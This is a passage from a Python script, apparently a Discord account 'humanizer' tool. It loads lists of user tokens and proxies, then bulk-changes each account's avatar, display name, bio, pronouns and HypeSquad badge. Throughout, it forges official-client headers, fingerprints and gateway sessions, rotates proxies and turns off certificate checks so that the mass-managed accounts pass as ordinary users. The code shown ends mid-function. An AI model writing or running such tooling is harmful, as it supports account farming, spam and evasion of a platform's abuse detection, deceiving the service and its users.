import sys
import subprocess
import os

if sys.platform == 'win32':
    try:
        sys.stdout.reconfigure(encoding='utf-8')
    except Exception:
        pass

if not getattr(sys, 'frozen', False):
    REQUIRED_PACKAGES = {
        'primp': 'primp',
        'colorama': 'colorama',
        'pillow': 'PIL',
        'websockets': 'websockets',
        'python-socks': 'python_socks'
    }

    def install_missing_packages():
        import importlib
        missing = []
        for pip_name, import_name in REQUIRED_PACKAGES.items():
            try:
                importlib.import_module(import_name)
            except ImportError:
                missing.append(pip_name)
        if not missing:
            return
        print(f"[setup] Installing missing packages: {', '.join(missing)}")
        result = subprocess.run([sys.executable, '-m', 'pip', 'install', *missing], capture_output=True, text=True)
        if result.returncode != 0:
            print(f'[setup] Installation failed:\n{result.stderr}')
            sys.exit(1)
        import importlib.util
        still_missing = []
        for pip_name, import_name in REQUIRED_PACKAGES.items():
            if pip_name in missing:
                spec = importlib.util.find_spec(import_name)
                if spec is None:
                    still_missing.append(pip_name)
        if still_missing:
            print(f'[setup] ERROR: These packages installed but still cannot be found: {still_missing}')
            print('[setup] Try running: pip install ' + ' '.join(still_missing))
            sys.exit(1)
        print('[setup] Restarting script...')
        os.execv(sys.executable, [sys.executable] + sys.argv)

    install_missing_packages()

import time
import base64
import hashlib
import re
import json
import uuid
import random
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed, wait, FIRST_COMPLETED
from typing import Optional, Dict, Any, List
from pathlib import Path
from io import BytesIO
from urllib.parse import urlparse, quote
import primp
from colorama import Fore, Style, init
from PIL import Image
import asyncio
import websockets
from python_socks.async_.asyncio import Proxy

init()

_async_loop = asyncio.new_event_loop()
_async_loop_thread = threading.Thread(target=_async_loop.run_forever, daemon=True)
_async_loop_thread.start()


def _script_dir() -> Path:
    if getattr(sys, 'frozen', False):
        return Path(sys.executable).parent
    return Path(__file__).parent


SCRIPT_DIR = _script_dir()
DATA_DIR = SCRIPT_DIR / 'data'
INPUT_DIR = SCRIPT_DIR / 'input'
AVATARS_DIR = SCRIPT_DIR / 'avatar'
BANNERS_DIR = SCRIPT_DIR / 'banners'
TOKENS_FILE = INPUT_DIR / 'tokens.txt'
PROXIES_FILE = INPUT_DIR / 'proxies.txt'
BIOS_FILE = DATA_DIR / 'bios.txt'
NAMES_FILE = DATA_DIR / 'names.txt'
PRONOUNS_FILE = DATA_DIR / 'pronouns.txt'
SUCCESS_FILE = INPUT_DIR / 'success.txt'
FAILED_FILE = INPUT_DIR / 'failed.txt'


def load_config():
    default_config = {
        'max_threads': 3,
        'avatar_dimension': 256,
        'max_avatar_cache': 100,
        'update_display_name': True,
        'update_bio': True,
        'update_pronouns': True,
        'update_avatar': True,
        'update_hypesquad': True,
        'RetryLimit': 1
    }
    config_path = SCRIPT_DIR / 'config.json'
    if config_path.exists():
        try:
            with open(config_path, 'r') as f:
                data = json.load(f)
                for key, val in data.items():
                    default_config[key] = val
        except Exception as e:
            print(f'{Fore.YELLOW}[WARN] Could not load config.json ({e}). Using defaults.{Style.RESET_ALL}')
    return default_config


config = load_config()
MAX_THREADS = config.get('max_threads', 3)
AVATAR_DIMENSION = config.get('avatar_dimension', 256)
MAX_AVATAR_CACHE = config.get('max_avatar_cache', 100)
UPDATE_DISPLAY_NAME = config.get('update_display_name', True)
UPDATE_BIO = config.get('update_bio', True)
UPDATE_PRONOUNS = config.get('update_pronouns', True)
UPDATE_AVATAR = config.get('update_avatar', True)
UPDATE_HYPESQUAD = config.get('update_hypesquad', True)
RETRY_LIMIT = config.get('RetryLimit', 1)

HYPESQUAD_HOUSES = {1: 'Bravery', 2: 'Brilliance', 3: 'Balance'}
DISCORD_API = 'https://discord.com/api/v9'
DISCORD_GATEWAY = 'wss://gateway.discord.gg/?v=9&encoding=json'
FALLBACK_BUILD_NUMBER = 519006
DISCORD_CLIENT_VERSION = '1.0.9171'
ELECTRON_VERSION = '34.5.1'
CHROME_VERSION_ELECTRON = '132'
DEFAULT_USER_AGENT = (
    f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
    f'(KHTML, like Gecko) discord/{DISCORD_CLIENT_VERSION} '
    f'Chrome/{CHROME_VERSION_ELECTRON}.0.0.0 Electron/{ELECTRON_VERSION} Safari/537.36'
)


def fetch_build_number() -> int:
    try:
        resp = primp.Client(verify=False).get('https://discord.com/login', timeout=10)
        if resp.status_code != 200:
            return FALLBACK_BUILD_NUMBER
        asset_urls = re.findall(r'/assets/([a-zA-Z0-9_-]+)\.js', resp.text)
        if not asset_urls:
            return FALLBACK_BUILD_NUMBER
        for asset_hash in reversed(asset_urls):
            try:
                js_resp = primp.Client(verify=False).get(f'https://discord.com/assets/{asset_hash}.js', timeout=10)
                if js_resp.status_code != 200:
                    continue
                match = re.search(r'buildNumber["\s:,]+(\d{4,7})', js_resp.text)
                if match:
                    return int(match.group(1))
            except Exception:
                pass
        return FALLBACK_BUILD_NUMBER
    except Exception:
        return FALLBACK_BUILD_NUMBER


BUILD_NUMBER = fetch_build_number()


def _random_uuid() -> str:
    return (
        f'{random.randint(10000000, 99999999)}-'
        f'{random.randint(1000, 9999)}-'
        f'{random.randint(1000, 9999)}-'
        f'{random.randint(1000, 9999)}-'
        f'{random.randint(100000000000, 999999999999)}'
    )


def generate_super_properties(launch_id, signature, heartbeat_id, native_build) -> str:
    props = {
        'os': 'Windows',
        'browser': 'Discord Client',
        'release_channel': 'stable',
        'client_version': DISCORD_CLIENT_VERSION,
        'os_version': '10.0.26100',
        'os_arch': 'x64',
        'app_arch': 'x64',
        'system_locale': 'en-US',
        'has_client_mods': False,
        'browser_user_agent': DEFAULT_USER_AGENT,
        'browser_version': ELECTRON_VERSION,
        'client_build_number': BUILD_NUMBER,
        'native_build_number': native_build,
        'client_event_source': None,
        'client_launch_id': launch_id,
        'launch_signature': signature,
        'client_heartbeat_session_id': heartbeat_id,
    }
    return base64.b64encode(json.dumps(props, separators=(',', ':')).encode()).decode()


stats = {'total': 0, 'success': 0, 'failed': 0, 'start_time': time.time()}
stats_lock = threading.Lock()
file_lock = threading.Lock()
print_lock = threading.Lock()


class ProxyManager:
    def __init__(self, proxies: List[str]):
        self.proxies = proxies
        self.lock = threading.Lock()
        self.index = 0
        self.bad_proxies = set()
        self.in_use = set()

    def get_proxy(self) -> Optional[str]:
        with self.lock:
            if not self.proxies:
                return None
            for _ in range(len(self.proxies)):
                proxy = self.proxies[self.index]
                self.index = (self.index + 1) % len(self.proxies)
                if proxy in self.bad_proxies or proxy in self.in_use:
                    continue
                self.in_use.add(proxy)
                return proxy
            for _ in range(len(self.proxies)):
                proxy = self.proxies[self.index]
                self.index = (self.index + 1) % len(self.proxies)
                if proxy not in self.bad_proxies:
                    return proxy
            return None

    def release_proxy(self, proxy: str):
        with self.lock:
            if proxy:
                self.in_use.discard(proxy)

    def mark_bad(self, proxy: str):
        with self.lock:
            if proxy:
                self.bad_proxies.add(proxy)

    def get_stats(self) -> Dict[str, int]:
        with self.lock:
            return {
                'total': len(self.proxies),
                'bad': len(self.bad_proxies),
                'active': len(self.proxies) - len(self.bad_proxies)
            }


proxy_manager: Optional[ProxyManager] = None

import ctypes
import shutil

Fore.GRAY = "\033[38;5;244m"
Fore.PURPLE = "\033[38;5;99m"
Fore.NEON_PINK = "\033[38;5;201m"
Fore.CYAN_BLUE = "\033[38;5;38m"
Fore.MINT_GREEN = "\033[38;5;48m"
Fore.CORAL_RED = "\033[38;5;204m"
Fore.GOLD = "\033[38;5;214m"


class Logger:
    def __init__(self):
        self.DIM = "\033[38;5;240m"
        self.TIME_GRAY = "\033[38;5;244m"
        self.KEY_GRAY = "\033[38;5;242m"
        self.WHITE = "\033[38;5;253m"
        self.SUCCESS = "\033[38;5;120m"
        self.FAIL = "\033[38;5;203m"
        self.WARN = "\033[38;5;214m"
        self.INFO = "\033[38;5;75m"
        self.PURPLE = "\033[38;5;141m"
        self.PINK = "\033[38;5;213m"
        self.RESET = "\033[0m"
        self.print_lock = threading.Lock()

    def get_time(self):
        return datetime.now().strftime("%H:%M:%S")

    def prefix(self, char, color):
        return f"{self.DIM}({color}{char}{self.DIM}){self.RESET}"

    def _log_token_status(self, char, char_color, tag, tag_color, status_text=None, **kwargs):
        with self.print_lock:
            time_str = f"{self.DIM}[{self.TIME_GRAY}{self.get_time()}{self.DIM}]{self.RESET}"
            pfx = self.prefix(char, char_color)
            tag_str = f"{tag_color}{tag:<6}{self.RESET}"
            sep = f"{self.DIM}»{self.RESET}"

            parts = []
            if 'token' in kwargs:
                parts.append(f"{self.KEY_GRAY}token:{self.RESET} {self.WHITE}{kwargs['token']}")
            if status_text:
                status_color = self.SUCCESS if status_text.lower() in ['valid', 'success', 'ok', 'updated'] else (self.FAIL if status_text.lower() in ['locked', 'invalid', 'failed', 'error'] else self.WHITE)
                parts.append(f"{self.KEY_GRAY}status:{self.RESET} {status_color}{status_text}")

            for k, v in kwargs.items():
                if k == 'token':
                    continue
                if k == 'lock':
                    parts.append(f"{self.KEY_GRAY}lock:{self.RESET} {self.WARN}{v}")
                elif k in ['type', 'action']:
                    parts.append(f"{self.KEY_GRAY}{k}:{self.RESET} {self.SUCCESS}{v}")
                elif k in ['nitro', 'boost']:
                    parts.append(f"{self.KEY_GRAY}{k}:{self.RESET} {self.PINK}{v}")
                elif k == 'age':
                    parts.append(f"{self.KEY_GRAY}age:{self.RESET} {self.INFO}{v}")
                elif k == 'redeemable':
                    parts.append(f"{self.KEY_GRAY}redeemable:{self.RESET} {self.INFO}{v}")
                elif k in ['retry_after', 'cooldown']:
                    parts.append(f"{self.KEY_GRAY}{k}:{self.RESET} {self.WARN}{v}")
                elif k == 'error':
                    parts.append(f"{self.KEY_GRAY}error:{self.RESET} {self.FAIL}{v}")
                elif k == 'detail':
                    parts.append(f"{self.KEY_GRAY}detail:{self.RESET} {self.WHITE}{v}")
                else:
                    parts.append(f"{self.KEY_GRAY}{k}:{self.RESET} {self.WHITE}{v}")

            details = f" {self.RESET}".join(parts)
            print(f"{time_str} {pfx} {tag_str} {sep} {details}{self.RESET}", flush=True)

    def success(self, msg='Valid', **kwargs):
        self._log_token_status('+', self.SUCCESS, 'VALID', self.SUCCESS, status_text=msg, **kwargs)

    def fail(self, msg, **kwargs):
        tag = msg.upper()
        if 'LOCK' in tag:
            tag = 'LOCKED'
        elif 'INVALID' in tag:
            tag = 'INVALID'
        elif 'FLAG' in tag:
            tag = 'FLAGGED'
        elif 'ERROR' in tag:
            tag = 'ERROR'
        else:
            tag = 'FAILED'
        self._log_token_status('-', self.FAIL, tag, self.FAIL, status_text=msg, **kwargs)

    def warning(self, msg, **kwargs):
        tag = 'RATELIMIT' if 'rate' in msg.lower() else 'WARN'
        self._log_token_status('*', self.WARN, tag, self.WARN, status_text=msg, **kwargs)

    def log_line(self, char, char_color, text):
        with self.print_lock:
            time_str = f"{self.DIM}[{self.TIME_GRAY}{self.get_time()}{self.DIM}]{self.RESET}"
            pfx = self.prefix(char, char_color)
            print(f"{time_str} {pfx} {text}{self.RESET}", flush=True)

    def inf(self, text):
        self.log_line('/', self.INFO, text)

    def info(self, text, **kwargs):
        if kwargs:
            extra = ', '.join(f"{k}= {v}" for k, v in kwargs.items())
            self.inf(f"{text} -> {extra}")
        else:
            self.inf(text)

    def input(self, text):
        time_str = f"{self.DIM}[{self.TIME_GRAY}{self.get_time()}{self.DIM}]{self.RESET}"
        pfx = self.prefix('?', self.PURPLE)
        print(f"\n{time_str} {pfx} {self.INFO}{text}{self.RESET} ", end='', flush=True)

    def __call__(self, log_type: str, token: str, message: str):
        masked = mask_token(token)
        action = None
        detail = None
        if message.startswith('[') and message.endswith(']') and ' : ' in message:
            inner = message[1:-1]
            parts = inner.split(' : ', 1)
            if len(parts) == 2:
                action = parts[0].strip()
                detail = parts[1].strip()

        kw = {'token': masked}
        if action and detail:
            if log_type == 'SUCCESS':
                self._log_token_status('+', self.SUCCESS, 'UPDATED', self.SUCCESS, action=action, detail=detail, **kw)
            elif log_type == 'FAILED':
                self._log_token_status('-', self.FAIL, 'ERROR', self.FAIL, error=f"{action} - {detail}", **kw)
            elif log_type == 'WARN':
                tag = 'RATELIMIT' if 'rate' in action.lower() or 'rate' in detail.lower() else 'WARN'
                self._log_token_status('*', self.WARN, tag, self.WARN, action=action, detail=detail, **kw)
            else:
                self._log_token_status('/', self.INFO, 'INFO', self.INFO, action=action, detail=detail, **kw)
        else:
            clean = message.strip('[]')
            if log_type == 'SUCCESS':
                self._log_token_status('+', self.SUCCESS, 'VALID', self.SUCCESS, status_text=clean, **kw)
            elif log_type == 'FAILED':
                self.fail(clean, **kw)
            elif log_type == 'WARN':
                self.warning(clean, **kw)
            else:
                self._log_token_status('/', self.INFO, 'INFO', self.INFO, status_text=clean, **kw)


log = Logger()
zlog = log

_title_done = False

def _title_loop():
    while not _title_done:
        try:
            time.sleep(0.5)
            with stats_lock:
                t = stats['total']; s = stats['success']; f = stats['failed']
                elapsed = max(time.time() - stats['start_time'], 0.001)
            processed = s + f
            pct = (processed / t * 100) if t else 0
            cps = processed / elapsed if elapsed else 0
            if os.name == 'nt':
                ctypes.windll.kernel32.SetConsoleTitleW(
                    f'Zenkai | Success: {s} | Failed: {f} | '
                    f'Progress: {pct:.1f}% | CPS: {cps:.1f}'
                )
        except Exception:
            pass

def get_timestamp() -> str:
    return datetime.now().strftime('%H:%M:%S')

def print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print()
    purple = "\033[38;5;141m"
    dim = "\033[38;5;240m"
    gray = "\033[38;5;245m"
    white = "\033[38;5;255m"
    reset = "\033[0m"
    print(f"  {purple}Dev: {white}@16zenkai {dim}• {gray}{reset}")
    print()

def display_banner():
    print_banner()

def mask_token(token: str) -> str:
    token_only = token.split(':')[-1]
    return (token_only[:12] + '****') if len(token_only) >= 12 else token_only

def log_simple(log_type: str, message: str):
    if log_type == 'SUCCESS':
        log.log_line('+', log.SUCCESS, message)
    elif log_type == 'FAILED':
        log.log_line('-', log.FAIL, message)
    elif log_type == 'WARN':
        log.log_line('*', log.WARN, message)
    else:
        log.inf(message)

def wait_for_enter():
    try:
        import msvcrt
        while True:
            if msvcrt.kbhit():
                key = msvcrt.getch()
                if key in (b'\r', b'\n'):
                    break
            time.sleep(0.05)
        print()
    except Exception:
        input()


def load_file_lines(file_path: Path) -> List[str]:
    if not file_path.exists():
        return []
    with open(file_path, 'r', encoding='utf-8') as f:
        return [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]


def append_to_file(file_path: Path, content: str):
    with file_lock:
        with open(file_path, 'a', encoding='utf-8') as f:
            f.write(content + '\n')


def remove_token_from_file(file_path: Path, token: str):
    with file_lock:
        try:
            lines = file_path.read_text(encoding='utf-8').splitlines()
            new_lines = [l for l in lines if extract_token(l) != token.strip()]
            file_path.write_text('\n'.join(new_lines) + ('\n' if new_lines else ''), encoding='utf-8')
        except Exception:
            pass


def format_time(seconds: float) -> str:
    minutes = int(seconds // 60)
    hours = minutes // 60
    if hours > 0:
        return f'{hours}h {minutes % 60}m'
    if minutes > 0:
        return f'{minutes}m {seconds % 60:.2f}s'
    return f'{seconds:.2f}s'


def is_valid_token(s: str) -> bool:
    if not s or len(s) < 50:
        return False
    parts = s.split('.')
    if len(parts) != 3:
        return False
    return all(re.match(r'^[A-Za-z0-9_-]+$', p) and len(p) > 0 for p in parts)


def extract_token(line: str) -> Optional[str]:
    line = line.strip()
    if not line:
        return None
    if is_valid_token(line):
        return line
    for delimiter in [':', '|', '\t', ' ']:
        if delimiter in line:
            for part in reversed(line.split(delimiter)):
                part = part.strip()
                if is_valid_token(part):
                    return part
    return None


def load_tokens(file_path: Path) -> List[str]:
    tokens = [extract_token(l) for l in load_file_lines(file_path)]
    tokens = [t for t in tokens if t]
    seen, deduped = set(), []
    for t in tokens:
        if t not in seen:
            seen.add(t)
            deduped.append(t)
    return deduped


def load_avatar_files() -> List[Path]:
    if not AVATARS_DIR.exists():
        return []
    valid_ext = {'.gif', '.png', '.webp', '.jpeg', '.jpg'}
    return [f for f in AVATARS_DIR.iterdir() if f.suffix.lower() in valid_ext]


DISCORD_AVATAR_MAX_BYTES = 1_000_000


def load_avatar_as_base64(image_path: Path) -> Optional[str]:
    try:
        with Image.open(image_path) as img:
            is_png = image_path.suffix.lower() == '.png'
            if is_png:
                if img.mode == 'P':
                    img = img.convert('RGBA')
            else:
                if img.mode in ['RGBA', 'P']:
                    img = img.convert('RGB')
            img = img.resize((AVATAR_DIMENSION, AVATAR_DIMENSION), Image.Resampling.LANCZOS)
            img_copy = img.copy()

        def _encode(pil_img, fmt, quality=80) -> str:
            buf = BytesIO()
            kw = {'format': fmt}
            if fmt == 'JPEG':
                kw['quality'] = quality
                kw['optimize'] = True
            pil_img.save(buf, **kw)
            buf.seek(0)
            return base64.b64encode(buf.read()).decode()

        img_format = 'PNG' if is_png else 'JPEG'
        b64 = _encode(img_copy, img_format)
        mime = 'image/png' if img_format == 'PNG' else 'image/jpeg'

        if len(b64) > DISCORD_AVATAR_MAX_BYTES:
            work = img_copy.convert('RGB') if img_copy.mode in ['RGBA', 'P', 'LA'] else img_copy
            mime = 'image/jpeg'
            for q in [80, 60, 40, 20]:
                b64 = _encode(work, 'JPEG', q)
                if len(b64) <= DISCORD_AVATAR_MAX_BYTES:
                    return f'data:{mime};base64,{b64}'
            half = max(64, AVATAR_DIMENSION // 2)
            work = work.resize((half, half), Image.Resampling.LANCZOS)
            for q in [80, 60, 40]:
                b64 = _encode(work, 'JPEG', q)
                if len(b64) <= DISCORD_AVATAR_MAX_BYTES:
                    return f'data:{mime};base64,{b64}'
            return None

        return f'data:{mime};base64,{b64}'
    except Exception:
        return None


def parse_proxy(proxy_string: str) -> Optional[str]:
    proxy = proxy_string.strip()
    if proxy.startswith('#'):
        return None
    if '://' in proxy:
        parsed = urlparse(proxy)
        return proxy if parsed.hostname and parsed.port else None
    if '@' in proxy:
        at_idx = proxy.rfind('@')
        auth = proxy[:at_idx]
        hostport = proxy[at_idx + 1:]
        colon_idx = auth.find(':')
        if colon_idx == -1:
            return None
        user, password = auth[:colon_idx], auth[colon_idx + 1:]
        hp = hostport.rsplit(':', 1)
        if len(hp) != 2:
            return None
        return f"http://{quote(user, safe='')}:{quote(password, safe='')}@{hp[0]}:{hp[1]}"
    parts = proxy.split(':')
    if len(parts) == 4:
        host, port, user, password = parts
        return f"http://{quote(user, safe='')}:{quote(password, safe='')}@{host}:{port}"
    if len(parts) == 2:
        return f'http://{parts[0]}:{parts[1]}'
    return None


class Humanizer:
    def __init__(self, token: str, proxy: Optional[str] = None):
        self.token = token
        self.proxy = proxy
        self.client = primp.Client(verify=False, proxy=proxy if proxy else None)
        self.user_agent = DEFAULT_USER_AGENT
        self.session_id = None
        self.proxy_failed = False
        self.is_locked = False
        self.installation_id = (
            f"{random.randint(1000000000000000000, 9999999999999999999)}."
            f"{''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_', k=22))}"
        )
        self._launch_id = str(uuid.uuid4())
        self._signature = str(uuid.uuid4())
        self._heartbeat_id = str(uuid.uuid4())
        self._native_build = random.randint(65600, 65800)
        self._super_props = generate_super_properties(
            self._launch_id, self._signature, self._heartbeat_id, self._native_build
        )

    def get_fingerprint(self) -> Optional[str]:
        try:
            r = self.client.get('https://discord.com/api/v9/experiments', timeout=30)
            if r.status_code == 200:
                return r.json().get('fingerprint')
            return None
        except Exception:
            return None

    async def _send_identify(self, ws) -> bool:
        try:
            hello = json.loads(await asyncio.wait_for(ws.recv(), timeout=15))
            if hello.get('op') != 10:
                return False
            identify_payload = {
                'op': 2,
                'd': {
                    'token': self.token,
                    'capabilities': 16381,
                    'properties': {
                        'os': 'Windows',
                        'browser': 'Discord Client',
                        'release_channel': 'stable',
                        'client_version': DISCORD_CLIENT_VERSION,
                        'os_version': '10.0.26100',
                        'os_arch': 'x64',
                        'app_arch': 'x64',
                        'system_locale': 'en-US',
                        'browser_user_agent': self.user_agent,
                        'browser_version': ELECTRON_VERSION,
                        'os_sdk_version': '26100',
                        'client_build_number': BUILD_NUMBER,
                        'native_build_number': self._native_build,
                        'client_event_source': None,
                        'design_id': 0,
                    },
                    'presence': {
                        'status': 'online',
                        'since': 0,
                        'activities': [],
                        'afk': False,
                    },
                    'compress': False,
                    'client_state': {
                        'guild_versions': {},
                        'highest_last_message_id': '0',
                        'read_state_version': 0,
                        'user_guild_settings_version': -1,
                        'user_settings_version': -1,
                        'private_channels_version': '0',
                        'api_code_version': 0,
                    }
                }
            }
            await ws.send(json.dumps(identify_payload))
            return True
        except Exception:
            return False

    async def _wait_for_ready(self, ws) -> bool:
        try:
            for _ in range(12):
                msg = json.loads(await asyncio.wait_for(ws.recv(), timeout=10))
                op, t = msg.get('op'), msg.get('t')
                if op == 11 or (op == 0 and t != 'READY'):
                    continue
                if t == 'READY':
                    self.session_id = msg['d'].get('session_id')
                    return True
                if op == 9:
                    return False
            return False
        except asyncio.TimeoutError:
            return False

    async def update_account_with_live_session(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        if getattr(self, 'is_locked', False):
            return {'success': False, 'error': 'Token Locked'}
        headers = self.get_headers()
        loop = asyncio.get_event_loop()

        if 'avatar' not in payload:
            direct = await loop.run_in_executor(None, lambda: self.update_user_profile(payload, headers))
            if direct.get('success') or direct.get('captcha') or direct.get('rate_limited'):
                return direct
            if not direct.get('unknown_session'):
                return direct

        async def _ws_patch(ws):
            if not await self._send_identify(ws):
                return {'success': False, 'error': 'Gateway IDENTIFY failed'}
            if not await self._wait_for_ready(ws):
                return {'success': False, 'error': 'Gateway READY timeout'}
            return await loop.run_in_executor(None, lambda: self.update_user_profile(payload, headers))

        extra = {'User-Agent': self.user_agent}
        try:
            if self.proxy:
                sock = await Proxy.from_url(self.proxy).connect(dest_host='gateway.discord.gg', dest_port=443)
                async with websockets.connect(
                    DISCORD_GATEWAY, additional_headers=extra, sock=sock,
                    server_hostname='gateway.discord.gg', open_timeout=60, close_timeout=10, max_size=None
                ) as ws:
                    return await _ws_patch(ws)
            else:
                async with websockets.connect(
                    DISCORD_GATEWAY, additional_headers=extra,
                    open_timeout=60, close_timeout=10, max_size=None
                ) as ws:
                    return await _ws_patch(ws)
        except Exception as e:
            err = str(e) or type(e).__name__
            if self.proxy and ('proxy' in err.lower() or 'connect' in err.lower()):
                self.proxy_failed = True
            return {'success': False, 'error': err}

    def update_account_sync(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        for attempt in range(2):
            try:
                result = asyncio.run_coroutine_threadsafe(
                    self.update_account_with_live_session(payload), _async_loop
                ).result()
                if result['success']:
                    return result
                if self._is_transient_error(str(result.get('error', ''))) and proxy_manager and attempt < 1:
                    np = proxy_manager.get_proxy()
                    if np:
                        self.proxy = np
                        self.client = primp.Client(verify=False, proxy=np)
                    continue
                return result
            except Exception as e:
                if attempt < 1 and proxy_manager:
                    np = proxy_manager.get_proxy()
                    if np:
                        self.proxy = np
                        self.client = primp.Client(verify=False, proxy=np)
                    continue
                return {'success': False, 'error': self._clean_error(str(e))}
        return {'success': False, 'error': 'Max retries reached'}

    def _clean_error(self, error) -> str:
        error = str(error)
        if 'RATE_LIMIT' in error or 'rate limit' in error.lower() or 'too often' in error.lower():
            return 'Rate Limited'
        if 'curl:' in error:
            for code, msg in [('(56)', 'Proxy closed'), ('(28)', 'Timeout'), ('(7)', 'Proxy failed')]:
                if code in error:
                    return msg
            m = re.search(r'curl: \((\d+)\)', error)
            return f'Curl {m.group(1)}' if m else 'Curl error'
        for needle, label in [
            ('Unknown Session', 'Bad session'),
            ('received 4000', 'Token locked / flagged (WS 4000)'),
            ('4000 (private', 'Token locked / flagged (WS 4000)'),
            ('received 4001', 'Invalid token (WS 4001)'),
            ('received 4004', 'Auth failed (WS 4004)'),
            ('received 4006', 'Session invalid (WS 4006)'),
            ('Unauthorized', 'Unauthorized'),
            ('401', 'Unauthorized'),
            ('Invalid Form Body', 'Invalid request'),
        ]:
            if needle in error:
                return label
        if 'captcha' in error.lower():
            return 'Captcha'
        if 'message' in error and 'code' in error:
            m = re.search(r"'message': '([^']+)'", error)
            if m:
                msg = m.group(1)
                return msg[:22] + '...' if len(msg) > 25 else msg
        return error[:77] + '...' if len(error) > 80 else error

    def get_headers(self) -> Dict[str, str]:
        headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US',
            'authorization': self.token,
            'content-type': 'application/json',
            'user-agent': self.user_agent,
            'x-debug-options': 'bugReporterEnabled',
            'x-discord-locale': 'en-US',
            'x-discord-timezone': 'Asia/Calcutta',
            'x-installation-id': self.installation_id,
            'x-super-properties': self._super_props,
        }
        fp = self.get_fingerprint()
        if fp:
            headers['x-fingerprint'] = fp
        return headers

    def _is_transient_error(self, error_str: str) -> bool:
        lower = error_str.lower()
        return any(kw in lower for kw in [
            'connection', 'proxy', 'timeout', 'reset', 'connect', 'sending',
            'refused', 'unreachable', 'eof', 'read error', 'gateway ready',
            'gateway identify', 'gateway', 'no close frame', 'connection closed', 'websocket'
        ])

    def _api_call_with_retry(self, method: str, url: str, data: Dict[str, Any],
                              headers: Dict[str, str], max_retries: int = 5) -> Dict[str, Any]:
        if getattr(self, 'is_locked', False):
            return {'success': False, 'error': 'Token Locked'}
        last_result = None
        for attempt in range(max_retries):
            if getattr(self, 'is_locked', False):
                return {'success': False, 'error': 'Token Locked'}
            try:
                fn = self.client.post if method.upper() == 'POST' else self.client.patch
                resp = fn(url, headers=headers, json=data, timeout=60)

                if resp.status_code in [200, 204]:
                    try:
                        rdata = resp.json() if resp.text and resp.status_code == 200 else {}
                    except Exception:
                        rdata = {}
                    return {'success': True, 'data': rdata}

                try:
                    error_data = resp.json() if resp.text and resp.text.strip() else {}
                except Exception:
                    error_data = {}

                if error_data.get('captcha_key'):
                    return {'success': False, 'captcha': True, 'error': error_data}

                if resp.status_code == 400 and isinstance(error_data, dict):
                    if error_data.get('code') == 10020:
                        return {'success': False, 'unknown_session': True, 'error': 'Unknown Session'}
                    for fe in error_data.get('errors', {}).values():
                        for err in fe.get('_errors', []):
                            if err.get('code') == 'AVATAR_RATE_LIMIT':
                                return {'success': False, 'rate_limited': True, 'retry_after': 0, 'error': 'Avatar Rate Limited'}

                if resp.status_code == 429:
                    try:
                        ra = float(
                            resp.headers.get('retry-after') or
                            resp.headers.get('Retry-After') or
                            (error_data.get('retry_after', 0) if isinstance(error_data, dict) else 0)
                        )
                    except (TypeError, ValueError):
                        ra = 0
                    time.sleep(max(ra, 1.0))
                    continue

                last_result = {'success': False, 'error': error_data}
                if resp.status_code in [401, 403]:
                    self.is_locked = True
                    return last_result

            except Exception as e:
                err_str = str(e)
                last_result = {'success': False, 'error': err_str}
                if self.proxy and self._is_transient_error(err_str):
                    self.proxy_failed = True
                if self._is_transient_error(err_str) and proxy_manager and attempt < max_retries - 1:
                    np = proxy_manager.get_proxy()
                    if np:
                        self.proxy = np
                        self.client = primp.Client(verify=False, proxy=np)
                if attempt >= max_retries - 1:
                    return last_result

        return last_result or {'success': False, 'error': 'Max retries reached'}

    def update_user_profile(self, data, headers):
        return self._api_call_with_retry('patch', f'{DISCORD_API}/users/@me', data, headers)

    def update_profile_fields(self, data, headers):
        return self._api_call_with_retry('patch', f'{DISCORD_API}/users/@me/profile', data, headers)

    def set_hypesquad(self, house_id: int, headers: Dict[str, str], retry_count: int = 0) -> Dict[str, Any]:
        time.sleep(random.uniform(2, 5))
        house_name = HYPESQUAD_HOUSES.get(house_id, 'Unknown')
        try:
            check = self.client.get(f'{DISCORD_API}/users/@me', headers=headers, timeout=30)
            if check.status_code == 200:
                flags = check.json().get('flags', 0)
                if flags & 14:
                    for hid, hname in HYPESQUAD_HOUSES.items():
                        if flags & (1 << hid):
                            log('INFO', self.token, f'[HypeSquad Already Set : {hname}]')
                            return {'success': True, 'house_name': hname, 'already_set': True}
        except Exception:
            pass
        res = self._api_call_with_retry('post', f'{DISCORD_API}/hypesquad/online', {'house_id': house_id}, headers, max_retries=2)
        if res.get('success'):
            return {'success': True, 'house_name': house_name}
        if retry_count < RETRY_LIMIT:
            log('WARN', self.token, f'[HypeSquad Retry : {retry_count + 1}/{RETRY_LIMIT} for {house_name}]')
            time.sleep(random.uniform(2.0, 4.0))
            return self.set_hypesquad(house_id, headers, retry_count + 1)
        return {'success': False, 'error': f'HypeSquad {house_name} not applied', 'house_name': house_name}

    def process(self, names, bios, pronouns_list, avatar_files, avatar_loader) -> bool:
        headers = self.get_headers()
        success = True
        parallel_tasks = []
        account_payload = {}
        avatar_name = display_name = None

        if UPDATE_AVATAR and avatar_files:
            try:
                ap = random.choice(avatar_files)
                ab64 = avatar_loader(ap)
                if ab64:
                    account_payload['avatar'] = ab64
                    av_hash = hashlib.md5(ab64[:100].encode()).hexdigest()
                    now = datetime.now()
                    now_str = now.strftime('%B {d}, %Y at {t}').format(
                        d=now.day, t=now.strftime('%I:%M %p').lstrip('0')
                    )
                    account_payload['avatar_description'] = f'{av_hash}, added {now_str}'
                    avatar_name = ap.name
            except Exception:
                pass

        if UPDATE_DISPLAY_NAME and names:
            try:
                display_name = random.choice(names)
                account_payload['global_name'] = display_name
            except Exception:
                pass

        if account_payload:
            parallel_tasks.append(('account', (account_payload, avatar_name, display_name)))

        profile_payload = {}
        bio = pronouns = None

        if UPDATE_BIO and bios:
            try:
                bio = random.choice(bios)
                profile_payload['bio'] = bio
            except Exception:
                pass

        if UPDATE_PRONOUNS and pronouns_list:
            try:
                pronouns = random.choice(pronouns_list)
                profile_payload['pronouns'] = pronouns
            except Exception:
                pass

        if profile_payload:
            parallel_tasks.append(('profile', (profile_payload, bio, pronouns)))

        if UPDATE_HYPESQUAD:
